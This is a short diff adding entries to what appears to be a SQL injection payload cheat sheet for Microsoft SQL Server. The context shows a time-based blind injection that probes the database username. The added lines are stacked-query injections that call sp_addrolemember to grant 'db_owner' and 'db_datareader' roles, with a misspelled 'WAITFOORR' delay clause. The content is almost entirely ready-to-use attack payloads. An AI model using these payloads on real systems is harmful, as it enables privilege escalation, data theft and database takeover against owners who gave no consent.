@@ -13,3 +13,9 @@ Some blind sqli
 ...
 '; IF ASCII(SUBSTRING(USER_NAME(),1,1)) < 100 WAITFOR DELAY '00:00:05    # Should be database username
 ```
+
+Add user roles
+```
+'; EXEC sp_addrolemember 'db_owner','Schema'; WAITFOORR DELAY '00:00:05
+'; EXEC sp_addrolemember 'db_datareader','Schema'; WAITFOORR DELAY '00:00:05
+```
